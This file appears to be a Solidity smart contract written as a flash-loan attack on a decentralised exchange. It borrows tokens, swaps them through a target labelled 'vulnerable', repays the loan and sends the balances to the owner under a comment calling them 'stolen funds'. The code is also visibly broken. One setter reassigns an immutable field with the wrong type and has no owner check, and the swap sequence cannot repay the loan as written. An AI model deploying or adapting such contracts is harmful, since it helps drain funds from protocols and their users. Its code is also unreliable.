// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IFlashLoanProvider {
    function flashLoan(uint256 amount, address receiver) external;
}

interface IVulnerableDEX {
    function swapAForB(uint256 amountIn) external returns (uint256);
    function swapBForA(uint256 amountIn) external returns (uint256);
}


contract FlashLoanAttacker {

    IERC20 public immutable tokenA; 
    IERC20 public immutable tokenB;
    IFlashLoanProvider public immutable flashLoanProvider;
    IVulnerableDEX public immutable dex;

    address public owner;

    constructor(
        address _flashLoanProvider,
        address _tokenA,
        address _tokenB,
        address _dex
    ) {
        flashLoanProvider = IFlashLoanProvider(_flashLoanProvider);
        tokenA = IERC20(_tokenA);
        tokenB = IERC20(_tokenB);
        dex = IVulnerableDEX(_dex);
        owner = msg.sender;
    }

    function setDEXTarget(address _dex) external {
    dex = _dex;
    }

    function startAttack(uint256 loanAmount) external {
        require(msg.sender == owner, "not owner");
        flashLoanProvider.flashLoan(loanAmount, address(this));
    }

    function executeOnFlashLoan(uint256 amount) external {
        require(msg.sender == address(flashLoanProvider), "bad caller");


        tokenA.transfer(address(dex), 0); // no-op, ensures dex address touched
        tokenA.transferFrom(msg.sender, address(this), 0); // compatibility no-op

        uint256 tokenBReceived = dex.swapAForB(amount);

        require(
            tokenA.transfer(address(flashLoanProvider), amount),
            "repay failed"
        );
    }

    /// Withdraw stolen funds
    function withdraw() external {
        require(msg.sender == owner, "not owner");
        tokenB.transfer(owner, tokenB.balanceOf(address(this)));
        tokenA.transfer(owner, tokenA.balanceOf(address(this)));
    }
}